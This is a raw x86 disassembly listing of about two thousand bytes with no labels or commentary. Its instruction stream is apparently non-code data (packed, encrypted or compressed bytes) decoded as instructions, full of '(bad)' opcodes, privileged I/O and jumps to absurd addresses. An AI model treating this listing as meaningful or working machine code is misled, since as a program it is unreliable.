  406589:	lds    esi,FWORD PTR [eax+0x3b]
  40658c:	adc    al,BYTE PTR [edi-0x53e829cf]
  406592:	loope  0x406586
  406594:	xor    eax,0xb288a4d8
  406599:	push   es
  40659a:	out    0x32,eax
  40659c:	add    ebx,DWORD PTR [eax+0x587683]
  4065a2:	mov    esp,0xde836777
  4065a7:	std    
  4065a8:	pop    edi
  4065a9:	or     ebx,edx
  4065ab:	sub    ebx,esp
  4065ad:	mov    eax,0x43db1fb8
  4065b2:	jno    0x4065f7
  4065b4:	jo     0x4065d5
  4065b6:	scas   eax,DWORD PTR es:[edi]
  4065b7:	aaa    
  4065b8:	xchg   edx,eax
  4065b9:	push   ebp
  4065ba:	fistp  QWORD PTR [ebx]
  4065bc:	push   ss
  4065bd:	or     ebp,DWORD PTR [edx]
  4065bf:	fxch   st(1)
  4065c1:	pop    ecx
  4065c2:	push   ds
  4065c3:	pushf  
  4065c4:	pop    ebx
  4065c5:	mov    esp,0xa2a82f96
  4065ca:	jmp    0x8af826d
  4065cf:	xchg   ebp,eax
  4065d0:	fwait
  4065d1:	in     eax,dx
  4065d2:	aas    
  4065d3:	mov    ds:0xa107ab44,al
  4065d8:	mov    WORD PTR [edx],?
  4065da:	push   ds
  4065db:	pop    edi
  4065dc:	in     eax,0x7a
  4065de:	sahf   
  4065df:	out    0x76,eax
  4065e1:	lahf   
  4065e2:	dec    ebx
  4065e3:	mov    al,0xfa
  4065e5:	xor    eax,0xa25742c5
  4065ea:	mov    ebx,0x2e3d944d
  4065ef:	xor    bh,BYTE PTR [eax+0x13]
  4065f2:	push   cs
  4065f3:	clc    
  4065f4:	xchg   esi,eax
  4065f5:	bnd jle 0x406599
  4065f8:	test   BYTE PTR [ebx+0x4829a49],dh
  4065fe:	add    BYTE PTR [ebp-0x47],bh
  406601:	xchg   DWORD PTR [ecx],ecx
  406603:	stos   BYTE PTR es:[edi],al
  406604:	push   eax
  406605:	mov    bl,0xd8
  406607:	sbb    dl,BYTE PTR [edi-0xea74951]
  40660d:	mov    esp,0xc76f24b4
  406612:	test   al,0x15
  406614:	cli    
  406615:	ret    
  406616:	xor    DWORD PTR [edi-0x24],eax
  406619:	shl    DWORD PTR [edx+0x55],1
  40661c:	int    0x58
  40661e:	cli    
  40661f:	adc    DWORD PTR [eax-0x2e],esi
  406622:	xor    eax,DWORD PTR [ebp+0x2b]
  406625:	mov    dl,0xab
  406627:	xchg   edx,esp
  406629:	or     esi,eax
  40662b:	mov    eax,ds:0xd2d5d0e9
  406630:	rcl    cl,cl
  406632:	fsubr  st,st(5)
  406634:	gs adc al,0x3
  406637:	(bad)  
  406638:	pop    esi
  406639:	hlt    
  40663a:	(bad)  
  40663b:	js     0x406633
  40663d:	jne    0x4066a5
  40663f:	(bad)  
  406641:	inc    esi
  406642:	std    
  406643:	xor    al,0xad
  406645:	(bad)  
  406646:	xlat   BYTE PTR ds:[ebx]
  406647:	sub    al,0xc3
  406649:	aam    0x4b
  40664b:	push   ds
  40664c:	test   cl,bh
  40664e:	or     DWORD PTR [eax-0x1f],edi
  406651:	pop    esi
  406652:	mov    esi,0x5e167be9
  406657:	jnp    0x406667
  406659:	in     eax,dx
  40665a:	mov    al,ds:0x7b4c70ea
  40665f:	or     edi,DWORD PTR [ebx-0x4f]
  406662:	std    
  406663:	sbb    al,0xc6
  406665:	int    0x1
  406667:	ins    BYTE PTR es:[edi],dx
  406668:	sub    BYTE PTR [edi-0x2c458786],cl
  40666e:	call   0xf0e0fc46
  406673:	sbb    BYTE PTR [edx-0x7],cl
  406676:	ds mov esi,0x5a8a58cd
  40667c:	pop    eax
  40667d:	push   ds
  40667e:	mov    dl,0xc1
  406680:	dec    edi
  406681:	ss pop ebx
  406683:	dec    ebx
  406684:	and    eax,0x355add0e
  406689:	mov    esi,0x63985239
  40668e:	lods   al,BYTE PTR ds:[esi]
  40668f:	repz enter 0x599c,0x43
  406694:	sub    al,0x8f
  406696:	stos   DWORD PTR es:[edi],eax
  406697:	adc    BYTE PTR [ecx+eax*1],bl
  40669a:	add    BYTE PTR [esi],dl
  40669c:	xor    BYTE PTR [edx],0x92
  40669f:	and    eax,0xbd3314cf
  4066a4:	dec    ebx
  4066a5:	js     0x406653
  4066a7:	xor    eax,0x27737f42
  4066ac:	std    
  4066ad:	jge    0x4066b5
  4066af:	mov    edx,0x5d3c1f59
  4066b4:	xor    dh,BYTE PTR [ebx]
  4066b6:	dec    ebp
  4066b7:	icebp  
  4066b8:	ffree  st(0)
  4066ba:	in     al,dx
  4066bb:	cwde   
  4066bc:	sahf   
  4066bd:	pushf  
  4066be:	adc    BYTE PTR cs:[ecx],0x54
  4066c2:	icebp  
  4066c3:	call   0x357e3a74
  4066c8:	sbb    al,0x8b
  4066ca:	loop   0x40672d
  4066cc:	fstp   TBYTE PTR [ecx+eax*2]
  4066cf:	sub    ch,cl
  4066d1:	int    0xac
  4066d3:	fdivr  DWORD PTR [edi+0x125e2b9c]
  4066d9:	push   ecx
  4066da:	adc    cl,dh
  4066dc:	mov    ch,0x99
  4066de:	sub    eax,0x6da1a764
  4066e3:	out    0x73,al
  4066e5:	mov    ecx,0x3b908fb4
  4066ea:	jecxz  0x406688
  4066ec:	enter  0xcfe9,0xfd
  4066f0:	cmc    
  4066f1:	loope  0x4066e8
  4066f3:	js     0x4066cf
  4066f5:	jmp    0x406681
  4066f7:	ja     0x406713
  4066f9:	inc    ebx
  4066fa:	jne    0x40672b
  4066fc:	daa    
  4066fd:	ins    BYTE PTR es:[edi],dx
  4066fe:	loope  0x4066de
  406700:	jne    0x406716
  406702:	aaa    
  406703:	dec    edx
  406704:	div    BYTE PTR ds:0x5ea9da73
  40670a:	nop
  40670b:	gs push 0xbcbaef80
  406711:	fbld   TBYTE PTR [ebp+0x428128b2]
  406717:	stos   BYTE PTR es:[edi],al
  406718:	sbb    eax,0x8c56b40f
  40671d:	imul   edx,DWORD PTR [edx+0x2b2af04],0xfffffffa
  406724:	mov    eax,0xe3930afc
  406729:	or     eax,0x6b19e60b
  40672e:	test   DWORD PTR [edi-0x6cc4a68a],ecx
  406734:	pop    ss
  406735:	imul   ecx,esp,0x74
  406738:	and    ch,BYTE PTR [ebx+0x69]
  40673b:	inc    eax
  40673c:	add    BYTE PTR [ebp-0x3ca2e8a5],cl
  406742:	mov    esi,0x3d4fd50b
  406747:	daa    
  406748:	dec    edx
  406749:	pop    eax
  40674a:	xor    eax,0x96d7172b
  40674f:	dec    ecx
  406750:	push   edx
  406751:	push   0x18
  406753:	call   0xd96c7d5b
  406758:	out    0x6,eax
  40675a:	outs   dx,DWORD PTR ds:[esi]
  40675b:	mov    dl,0xe6
  40675d:	and    al,0x90
  40675f:	in     al,0xe7
  406761:	xchg   ecx,eax
  406762:	mov    edi,0x4a169aa9
  406767:	and    bh,al
  406769:	(bad)  
  40676b:	ret    0xf833
  40676e:	mov    dh,0xde
  406770:	jle    0x4067ae
  406772:	mov    eax,ds:0xcf00cfb2
  406777:	cld    
  406778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406779:	mov    al,0x63
  40677b:	jb     0x4067fa
  40677d:	pop    es
  40677e:	fisttp WORD PTR [ebx+0x6c38d227]
  406784:	adc    esp,DWORD PTR [ebx-0x4af5d8b4]
  40678a:	or     eax,0xbbc88500
  40678f:	mov    bl,0x3a
  406791:	loopne 0x406769
  406793:	cmp    al,BYTE PTR [ebx-0x6ba5942b]
  406799:	mov    eax,ds:0xcf7c6ce5
  40679e:	or     dl,BYTE PTR [ebp+0x42a8bb82]
  4067a4:	mov    fs,WORD PTR [edi]
  4067a6:	(bad)  
  4067a7:	sbb    bh,cl
  4067a9:	lea    edi,[ebx]
  4067ab:	dec    esp
  4067ac:	sub    BYTE PTR [esp+eiz*2],al
  4067af:	loopne 0x4067a6
  4067b1:	mov    ecx,0x73a0aceb
  4067b6:	adc    ebp,DWORD PTR [bx]
  4067b9:	es xchg edi,eax
  4067bb:	rcl    DWORD PTR [ecx+0x54],cl
  4067be:	arpl   WORD PTR fs:[ebx+0x29b489ef],cx
  4067c5:	ror    DWORD PTR [ecx+0x48],0x69
  4067c9:	mov    bh,0x80
  4067cb:	int3   
  4067cc:	ret    
  4067cd:	push   edx
  4067ce:	ret    0x8cdc
  4067d1:	inc    ecx
  4067d2:	push   edx
  4067d3:	pop    ebx
  4067d4:	push   esi
  4067d5:	retf   0xfe94
  4067d8:	xchg   esi,eax
  4067d9:	mov    ebp,0x408b895b
  4067de:	inc    eax
  4067df:	loopne 0x406762
  4067e1:	in     al,0xbb
  4067e3:	sub    esp,DWORD PTR ds:0xeba4c9db
  4067e9:	push   ecx
  4067ea:	retf   0x2e1a
  4067ed:	mov    bh,0x3
  4067ef:	xor    edx,DWORD PTR [edx]
  4067f1:	lahf   
  4067f2:	int3   
  4067f3:	add    eax,0x494c4485
  4067f8:	ficomp WORD PTR [ecx+0xa4cae81]
  4067fe:	xchg   edx,eax
  4067ff:	and    DWORD PTR [edx+ecx*8+0x7e6d41c6],ecx
  406806:	mov    BYTE PTR [edx+0x41],dl
  406809:	scas   al,BYTE PTR es:[edi]
  40680a:	(bad)  
  40680c:	add    ch,0xb9
  40680f:	hlt    
  406810:	add    ecx,0xe6a3f7e9
  406816:	imul   edx,DWORD PTR [esi+0x6ed500d],0x28a53195
  406820:	and    al,0x40
  406822:	dec    edx
  406823:	aam    0xf7
  406825:	add    dh,BYTE PTR ds:0xbf20408
  40682b:	jmp    FWORD PTR ds:0x8cc34c6b
  406831:	stos   DWORD PTR es:[edi],eax
  406832:	or     dh,BYTE PTR [esi]
  406834:	sub    DWORD PTR [ebp+ecx*1+0x7fa587fe],0xa8549204
  40683f:	mov    dl,0x8b
  406841:	mov    ebp,0x2d0367df
  406846:	(bad)  
  406848:	(bad)  
  40684a:	pop    edi
  40684b:	sahf   
  40684c:	sti    
  40684d:	hlt    
  40684e:	push   esp
  40684f:	popa   
  406850:	pop    eax
  406851:	daa    
  406852:	(bad)  
  406853:	cmp    al,0x93
  406855:	sahf   
  406856:	cmp    eax,DWORD PTR [edi+0x1a]
  406859:	pushf  
  40685a:	sub    DWORD PTR [edi+0x2d9ebcb9],esi
  406860:	cmp    BYTE PTR [edx+ecx*8+0x19],bh
  406864:	mov    ebx,0x214de9cc
  406869:	out    0x93,al
  40686b:	pop    ebp
  40686c:	xchg   ecx,eax
  40686d:	les    ebp,FWORD PTR [ebx-0x75]
  406870:	pop    edx
  406871:	int3   
  406872:	js     0x406831
  406874:	and    bl,al
  406876:	enter  0xc95f,0xe9
  40687a:	mov    DWORD PTR [eax-0x17],ebp
  40687d:	dec    ecx
  40687e:	mov    ds:0x6e314b93,al
  406883:	mov    eax,0x46e6d89d
  406888:	lahf   
  406889:	out    dx,eax
  40688a:	push   ds
  40688b:	leave  
  40688c:	fisubr DWORD PTR [ebp-0x3c]
  40688f:	cdq    
  406890:	or     DWORD PTR [edi],ebx
  406892:	push   cs
  406893:	dec    esi
  406894:	cdq    
  406895:	aad    0x92
  406897:	stc    
  406898:	adc    dh,BYTE PTR [ecx+0x60]
  40689b:	or     BYTE PTR [ebx+0x5a136382],ch
  4068a1:	es inc ebp
  4068a3:	std    
  4068a4:	call   FWORD PTR [ebp-0x2]
  4068a7:	lock or eax,0x996519e0
  4068ad:	push   DWORD PTR ds:0xd0423b35
  4068b3:	cmp    eax,0x2d3a1a91
  4068b8:	xor    al,0x2f
  4068ba:	push   ebp
  4068bb:	pop    ds
  4068bc:	mov    ds:0x235ace0,al
  4068c1:	mov    fs,WORD PTR [ebx+0x59]
  4068c4:	xchg   ebx,edi
  4068c6:	pop    ds
  4068c7:	adc    al,0x3b
  4068c9:	dec    eax
  4068ca:	push   ecx
  4068cb:	aad    0x3d
  4068cd:	cmp    eax,0x3d75b62f
  4068d2:	pop    ebp
  4068d3:	mov    esp,0x67326874
  4068d8:	xlat   BYTE PTR ds:[ebx]
  4068d9:	xor    eax,0x925b556f
  4068de:	push   ecx
  4068df:	add    bh,BYTE PTR [edx-0x287a23ea]
  4068e5:	(bad)  
  4068e6:	stos   DWORD PTR es:[edi],eax
  4068e7:	lea    esi,[ebx+ebx*4]
  4068ea:	xor    ah,BYTE PTR [edx-0x6b325a52]
  4068f0:	mov    dl,0x3c
  4068f2:	sbb    DWORD PTR ds:0x9bc4181b,ebx
  4068f8:	aas    
  4068f9:	push   ebx
  4068fa:	das    
  4068fb:	icebp  
  4068fc:	jbe    0x4068cc
  4068fe:	(bad)  
  4068ff:	mov    ecx,0xda0e1f2
  406904:	pop    ebp
  406905:	mov    bh,BYTE PTR [edx+0x4e675af1]
  40690b:	mov    ds:0x2141a3b6,eax
  406910:	jp     0x40698a
  406912:	push   ss
  406913:	inc    esp
  406914:	sbb    al,0x45
  406916:	adc    eax,0xc16b58d0
  40691b:	and    DWORD PTR [edi-0x7a],ebx
  40691e:	mov    ds:0x955369b1,eax
  406923:	sub    al,0x91
  406925:	add    BYTE PTR [esi-0x21],bl
  406928:	mov    edx,0x65217598
  40692d:	imul   DWORD PTR [esi+0x562de2fd]
  406933:	xchg   esp,eax
  406934:	and    al,0xe1
  406936:	jo     0x40697e
  406938:	shr    BYTE PTR [esi+0x17bfe842],0x45
  40693f:	mov    eax,ds:0xf26a305b
  406944:	mov    bl,ah
  406946:	mov    esi,0x4608c9fc
  40694b:	(bad)  
  40694d:	outs   dx,BYTE PTR ds:[esi]
  40694e:	imul   eax,ebp,0xf21acb0f
  406954:	mov    bh,0x42
  406956:	test   al,0x2d
  406958:	hlt    
  406959:	mov    eax,0x345890ce
  40695e:	test   al,0x45
  406960:	pop    esi
  406961:	pop    ds
  406962:	jl     0x40691d
  406964:	cld    
  406965:	std    
  406966:	inc    esi
  406967:	mov    ds:0xdad586b1,eax
  40696c:	les    ecx,FWORD PTR [ebp-0x80]
  40696f:	dec    ecx
  406970:	mov    ds:0xc82291db,eax
  406975:	clc    
  406976:	adc    DWORD PTR [edi-0x7743417f],ebx
  40697c:	sub    bh,al
  40697e:	pop    esp
  40697f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406980:	mov    esi,0x73acae26
  406985:	fstp   DWORD PTR [esi]
  406987:	fidivr WORD PTR [edx+0x71]
  40698a:	xor    ebx,DWORD PTR [eax-0x7c935597]
  406990:	or     esi,DWORD PTR [ebp-0x11]
  406993:	and    cl,BYTE PTR [edx-0x34248bd6]
  406999:	lds    edi,FWORD PTR [ebx+0x721926ad]
  40699f:	sub    BYTE PTR [ebp+0x7f],dh
  4069a2:	seto   BYTE PTR [eax-0x76]
  4069a6:	mov    ebp,0x141f3396
  4069ab:	xor    ah,BYTE PTR [eax-0x31]
  4069ae:	lea    ebx,[esi+ecx*2+0x79c153f9]
  4069b5:	popa   
  4069b6:	adc    DWORD PTR [esi-0x2e828ac4],0xffffffa6
  4069bd:	jmp    0xce29689c
  4069c2:	stc    
  4069c3:	fisub  DWORD PTR [edx-0x6fe9fc3a]
  4069c9:	in     al,0xd7
  4069cb:	aam    0xc4
  4069cd:	stos   DWORD PTR es:[edi],eax
  4069ce:	pop    ss
  4069cf:	xor    al,0x56
  4069d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069d2:	clc    
  4069d3:	out    dx,eax
  4069d4:	xchg   edx,eax
  4069d5:	xchg   edi,eax
  4069d6:	fnstsw WORD PTR [ecx-0x58be2b9e]
  4069dc:	rol    ebx,cl
  4069de:	not    BYTE PTR [ecx+0x5f7ab8fa]
  4069e4:	xchg   ebx,eax
  4069e5:	inc    esi
  4069e6:	mov    dh,0x9f
  4069e8:	mov    ah,0xa8
  4069ea:	call   0xffd5a18a
  4069ef:	into   
  4069f0:	push   0x2d
  4069f2:	in     eax,0xeb
  4069f4:	shl    DWORD PTR [eax-0x29779b9],0x4b
  4069fb:	mov    edi,esi
  4069fd:	out    0xa9,al
  4069ff:	jle    0x4069ae
  406a01:	sub    bl,BYTE PTR [ebp-0x9291f75]
  406a07:	mov    ebx,0x89f70cc7
  406a0c:	push   ecx
  406a0d:	aad    0x8b
  406a0f:	xor    ch,BYTE PTR [eax+0x325d33c1]
  406a15:	faddp  st(7),st
  406a17:	jecxz  0x4069ba
  406a19:	cwde   
  406a1a:	std    
  406a1b:	add    eax,0xfd0bc2be
  406a20:	pop    es
  406a21:	leave  
  406a22:	les    ecx,FWORD PTR [ecx]
  406a24:	or     BYTE PTR [esi-0x1d],cl
  406a27:	cld    
  406a28:	xor    BYTE PTR [edx-0x6d17003d],dh
  406a2e:	rep lods eax,DWORD PTR ds:[esi]
  406a30:	mov    edi,0xcdb9c4b4
  406a35:	loope  0x406a09
  406a37:	outs   dx,DWORD PTR ds:[esi]
  406a38:	sub    DWORD PTR [ebp-0x7c],esp
  406a3b:	repnz add dh,dh
  406a3e:	adc    ebx,0xc6ce7c50
  406a44:	addr16 (bad) 
  406a46:	arpl   WORD PTR [eax],di
  406a48:	jp     0x406a5c
  406a4a:	frstor [eax]
  406a4c:	arpl   WORD PTR [edi-0x45],si
  406a4f:	fild   WORD PTR [ecx]
  406a51:	xchg   DWORD PTR [edi+0x89b5c16],esp
  406a57:	ficom  DWORD PTR [ebx+edx*4+0x6a2b187e]
  406a5e:	mov    al,0x25
  406a60:	pop    ss
  406a61:	dec    edi
  406a62:	fnstenv [ecx+eax*1]
  406a65:	stos   DWORD PTR es:[edi],eax
  406a66:	into   
  406a67:	pop    edi
  406a68:	adc    cl,BYTE PTR [eax]
  406a6a:	hlt    
  406a6b:	mov    esi,eax
  406a6d:	(bad)  
  406a6e:	add    ebp,edi
  406a70:	out    0x57,eax
  406a72:	sub    eax,0x61a82590
  406a77:	inc    ebp
  406a78:	jbe    0x406a1e
  406a7a:	adc    cl,BYTE PTR [esi-0x7d]
  406a7d:	dec    ebx
  406a7e:	inc    ecx
  406a7f:	xchg   ebx,eax
  406a80:	cmp    DWORD PTR [edx-0x23],eax
  406a83:	cmp    al,0xb3
  406a85:	pop    es
  406a86:	fsub   QWORD PTR [ecx]
  406a88:	test   esi,ebx
  406a8a:	lock lea edx,[ebp-0xd444f68]
  406a91:	xlat   BYTE PTR ds:[ebx]
  406a92:	jne    0x406afb
  406a94:	inc    eax
  406a95:	cld    
  406a96:	test   BYTE PTR [esi+0x2],ah
  406a99:	adc    eax,0x3c7145cd
  406a9e:	mov    ss,WORD PTR [eax+ebp*4-0x595689b8]
  406aa5:	xchg   edi,eax
  406aa6:	xor    BYTE PTR [eax+0x2a6a90ef],ah
  406aac:	mov    ah,0x75
  406aae:	ret    
  406aaf:	(bad)  
  406ab0:	loopne 0x406a78
  406ab2:	ins    DWORD PTR es:[edi],dx
  406ab3:	xchg   ebp,eax
  406ab4:	inc    ebx
  406ab5:	into   
  406ab6:	adc    BYTE PTR [edi-0x3d],0x1e
  406aba:	xchg   BYTE PTR [edx],bh
  406abc:	xor    ecx,ebx
  406abe:	(bad)  
  406abf:	idiv   BYTE PTR ds:0x167fae0c
  406ac5:	jae    0x406a97
  406ac7:	cdq    
  406ac8:	std    
  406ac9:	pop    edx
  406aca:	dec    ebp
  406acb:	mov    esi,0x11c00f19
  406ad0:	enter  0x9fe0,0xce
  406ad4:	xchg   esi,eax
  406ad5:	cmp    dh,dl
  406ad7:	jge    0x406aee
  406ad9:	xchg   DWORD PTR [ebx-0x276648f],ebp
  406adf:	outs   dx,DWORD PTR ds:[esi]
  406ae0:	(bad)  
  406ae1:	in     al,0xbb
  406ae3:	fld    QWORD PTR [edx]
  406ae5:	mov    dh,BYTE PTR gs:[eax+0x5dd8c3b]
  406aec:	cmp    cl,al
  406aee:	mov    ds:0x8507c4c9,al
  406af3:	fs loopne 0x406b74
  406af6:	shr    BYTE PTR [edi+ebp*2+0x3d4a5eb6],0x4d
  406afe:	out    dx,al
  406aff:	bound  edx,QWORD PTR ds:0x3a00f38
  406b05:	mov    ah,0x29
  406b07:	cld    
  406b08:	push   esp
  406b09:	pop    edx
  406b0a:	aad    0xc4
  406b0c:	cmp    eax,0x41dbfb0c
  406b11:	or     DWORD PTR [edi+0x66],edx
  406b14:	jg     0x406b2c
  406b16:	xchg   DWORD PTR [ebx-0x6f709d25],edx
  406b1c:	jb     0x406b45
  406b1e:	jno    0x406adc
  406b20:	scas   al,BYTE PTR es:[edi]
  406b21:	mov    dh,0xb2
  406b23:	adc    DWORD PTR [eax-0x55],ebp
  406b26:	lahf   
  406b27:	add    edx,ecx
  406b29:	ret    
  406b2a:	pmulhuw mm2,QWORD PTR [edx+0x1f8ecfd8]
  406b31:	xor    eax,0x650e01f
  406b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b37:	stc    
  406b38:	iret   
  406b39:	mov    esp,0xd0a77295
  406b3e:	iret   
  406b3f:	or     DWORD PTR [edx+0x266c6fc6],0xab65d0bf
  406b49:	mov    esp,0x9f6b6e66
  406b4e:	ret    
  406b4f:	nop
  406b50:	bswap  esp
  406b52:	jmp    0x4d970df0
  406b57:	mov    eax,ds:0x5211695b
  406b5c:	icebp  
  406b5d:	pop    esi
  406b5e:	mov    edi,ebx
  406b60:	mov    ebp,0x69782923
  406b65:	cwde   
  406b66:	cmp    edx,DWORD PTR [ebx+0x2f2c5329]
  406b6c:	cmp    BYTE PTR [eax],dl
  406b6e:	mov    dl,0x76
  406b70:	mov    al,ds:0xf5ea9b75
  406b75:	and    eax,0xa8bc925d
  406b7a:	xor    DWORD PTR [ebp+0x793353de],edx
  406b80:	in     al,0x89
  406b82:	and    eax,0x6a16496e
  406b87:	jo     0x406bff
  406b89:	loop   0x406b57
  406b8b:	mov    bl,0x4d
  406b8d:	dec    ebp
  406b8e:	jb     0x406b70
  406b90:	jns    0x406b3f
  406b92:	cmp    al,0x49
  406b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b95:	cmp    edi,DWORD PTR [ebx]
  406b97:	repnz inc ebx
  406b99:	xor    al,0xb0
  406b9b:	jl     0x406b7e
  406b9d:	add    al,0x61
  406b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ba0:	mov    eax,ds:0x80231af9
  406ba5:	out    0xc2,eax
  406ba7:	mov    esp,0xb5593fbd
  406bac:	xor    dh,BYTE PTR [edi-0x1b]
  406baf:	adc    BYTE PTR [eax-0x271675ee],0x84
  406bb6:	sbb    DWORD PTR [edx],edx
  406bb8:	pop    ebp
  406bb9:	lods   eax,DWORD PTR ss:[esi]
  406bbb:	inc    eax
  406bbc:	mov    eax,0xf751ddf
  406bc1:	sbb    dh,bl
  406bc3:	jge    0x406bb2
  406bc5:	aaa    
  406bc6:	shr    DWORD PTR [edi+0x7e],0xa5
  406bca:	pop    ecx
  406bcb:	add    al,0x5e
  406bcd:	cmp    eax,0x2613ea8e
  406bd2:	xor    eax,0x4b7d2f78
  406bd7:	lea    edx,[edx]
  406bd9:	(bad)  
  406bda:	in     eax,0xf9
  406bdc:	(bad)  
  406bdd:	rol    DWORD PTR [edx-0x68e246d4],0x11
  406be4:	adc    BYTE PTR [edi+eax*2-0x27],al
  406be8:	in     al,0xfb
  406bea:	or     ebp,ebx
  406bec:	cwde   
  406bed:	enter  0x5b49,0x7f
  406bf1:	adc    al,0x0
  406bf3:	in     eax,0x46
  406bf5:	mov    ecx,0x1cccc611
  406bfa:	dec    ebp
  406bfb:	stc    
  406bfc:	ss xor eax,0x7239d8f4
  406c02:	in     eax,0x36
  406c04:	dec    eax
  406c05:	cmp    eax,0xce917c7e
  406c0a:	mov    al,0xc6
  406c0c:	mov    ds:0x331da99d,al
  406c11:	hlt    
  406c12:	jmp    0x406c3d
  406c14:	push   ss
  406c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c16:	loopne 0x406c1d
  406c18:	mov    cs,ebx
  406c1a:	imul   ecx,DWORD PTR [ebx],0x350ba9e3
  406c20:	inc    esp
  406c21:	pop    es
  406c22:	sbb    edi,0xfffffffa
  406c25:	in     eax,dx
  406c26:	jecxz  0x406ca2
  406c28:	inc    DWORD PTR [edi]
  406c2a:	sar    DWORD PTR [ebx-0x26],cl
  406c2d:	and    ebp,DWORD PTR [ebx+0x44]
  406c30:	and    ebx,DWORD PTR [edx+0x1ba54839]
  406c36:	mov    ds:0x128dbd4f,eax
  406c3b:	mov    ds:0xc2ed3280,al
  406c40:	inc    ebp
  406c41:	mov    DWORD PTR [esi+0xe625cd0],ecx
  406c47:	icebp  
  406c48:	popf   
  406c49:	mov    dh,0x8a
  406c4b:	mov    al,0x6a
  406c4d:	pop    ebx
  406c4e:	inc    ebp
  406c4f:	mov    edi,0xcf684740
  406c54:	xor    BYTE PTR [ebp+0x50],al
  406c57:	mov    ebp,0xcb579dbd
  406c5c:	hlt    
  406c5d:	loopne 0x406c47
  406c5f:	mov    al,ds:0x18b6ef48
  406c64:	lods   al,BYTE PTR ds:[esi]
  406c65:	mov    cl,0x2b
  406c67:	jmp    0x406ce3
  406c69:	popa   
  406c6a:	and    ecx,DWORD PTR [edx]
  406c6c:	adc    edx,0xffffffdd
  406c6f:	addr16 dec ecx
  406c71:	push   esi
  406c72:	or     eax,0x3f633c76
  406c77:	cmp    ebp,0xfffffff0
  406c7a:	inc    ecx
  406c7b:	cmc    
  406c7c:	cmc    
  406c7d:	sub    DWORD PTR [esi-0x5766fe12],0x29
  406c84:	fiadd  WORD PTR [eax+0x70059439]
  406c8a:	sbb    BYTE PTR [edi],dl
  406c8c:	inc    eax
  406c8d:	icebp  
  406c8e:	jg     0x406cf6
  406c90:	sti    
  406c91:	sub    BYTE PTR [esi-0x2f722a4e],ah
  406c97:	or     BYTE PTR [edx],bh
  406c99:	sti    
  406c9a:	nop
  406c9b:	mov    ebp,0x6b087d0f
  406ca0:	loop   0x406d05
  406ca2:	jno    0x406c68
  406ca4:	stc    
  406ca5:	ins    DWORD PTR es:[edi],dx
  406ca6:	sub    esi,ebp
  406ca8:	jg     0x406c3a
  406caa:	xchg   ebx,eax
  406cab:	jns    0x406ca4
  406cad:	cdq    
  406cae:	or     eax,0x1d8b619c
  406cb3:	in     eax,0x61
  406cb5:	std    
  406cb6:	xchg   edi,eax
  406cb7:	retf   0x8780
  406cba:	fnstenv [eax+0x2d]
  406cbd:	cmc    
  406cbe:	into   
  406cbf:	fiadd  DWORD PTR [eax+ecx*2]
  406cc2:	and    al,0x69
  406cc4:	xlat   BYTE PTR ds:[ebx]
  406cc5:	inc    ebp
  406cc6:	enter  0x9164,0x64
  406cca:	inc    edi
  406ccb:	mov    ds:0x9f60172d,eax
  406cd0:	lea    esi,[edi+0x526bafcd]
  406cd6:	xchg   BYTE PTR [ecx+0x7450daef],bh
  406cdc:	and    DWORD PTR [esi-0x1d],esp
  406cdf:	dec    ecx
  406ce0:	arpl   WORD PTR [esi],bp
  406ce2:	push   eax
  406ce3:	mul    DWORD PTR [edx+eax*2]
  406ce6:	fdiv   st(0),st
  406ce8:	dec    esi
  406ce9:	or     al,0x3d
  406ceb:	pop    ebx
  406cec:	push   0x39
  406cee:	cdq    
  406cef:	mov    eax,0xcef1757a
  406cf4:	test   al,0x9c
  406cf6:	call   0x7651:0x2b232222
  406cfd:	popa   
  406cfe:	cmp    al,0xe3
  406d00:	sbb    esi,DWORD PTR [edi+0x2a]
  406d03:	and    ah,BYTE PTR gs:[ecx+ebx*8+0x37]
  406d08:	mov    ebx,0xe81f7abe
  406d0d:	jg     0x406d87
  406d0f:	pusha  
  406d10:	dec    ecx
  406d11:	mov    es,WORD PTR [edx+0x631bfcc0]
  406d17:	lods   al,BYTE PTR ds:[esi]
  406d18:	mov    ch,0xa3
  406d1a:	sbb    DWORD PTR ds:0xc042afbc,ebx
  406d20:	ret    0x7a32
  406d23:	out    dx,eax
  406d24:	xchg   edx,eax
  406d25:	fisttp WORD PTR [edx*1-0x58ccd010]
  406d2c:	jbe    0x406ce2
  406d2e:	popa   
  406d2f:	mov    esi,DWORD PTR [edi+0x52]
  406d32:	mov    cs,WORD PTR [esi-0x4b]
  406d35:	xor    esi,DWORD PTR [ebx-0x57]
  406d38:	adc    eax,0xf6f3fac
  406d3d:	mov    ch,0x13
  406d3f:	add    eax,0x8f428cc8
  406d44:	fisubr DWORD PTR [ebx+0x77]
  406d47:	test   DWORD PTR [esi],0xf3104d14
  406d4d:	sub    eax,0x91c3eba9
  406d52:	test   eax,0xe4a78b30
  406d57:	add    esi,DWORD PTR [edi-0x492e1f11]
  406d5d:	and    dl,BYTE PTR [esi-0x26e19b9e]
  406d63:	dec    edi
  406d64:	xlat   BYTE PTR ds:[ebx]
  406d65:	jnp    0x406d6a
  406d67:	scas   eax,DWORD PTR es:[edi]
  406d68:	fadd   st(5),st
  406d6a:	mov    ds:0x2433929a,al
  406d6f:	xchg   BYTE PTR [ebp-0x10f62a16],dl
  406d75:	fs xor dh,al
  406d78:	pop    ds
  406d79:	mov    dh,0x6f
  406d7b:	stos   DWORD PTR es:[edi],eax
  406d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d7d:	sub    al,0x9
  406d7f:	nop
  406d80:	std    
  406d81:	test   eax,0xa3b91a8e
  406d86:	pusha  
  406d87:	xchg   BYTE PTR [eax+0x290b7798],ah
  406d8d:	mov    edi,0x4aff7293
  406d92:	fcmovu st,st(6)
  406d94:	push   edx
  406d95:	xchg   edi,eax
  406d96:	addr16 pop ecx
  406d98:	loop   0x406ded
  406d9a:	push   0xf29887d4
  406d9f:	push   ebx
  406da0:	jbe    0x406daf
  406da2:	cmp    dl,BYTE PTR [ebx]
  406da4:	outs   dx,DWORD PTR ds:[esi]
  406da5:	sub    al,0xdf
  406da7:	cmp    ah,BYTE PTR [ebx-0x1fcc3606]
  406dad:	in     al,dx
  406dae:	sub    esi,DWORD PTR [edx+edx*2]
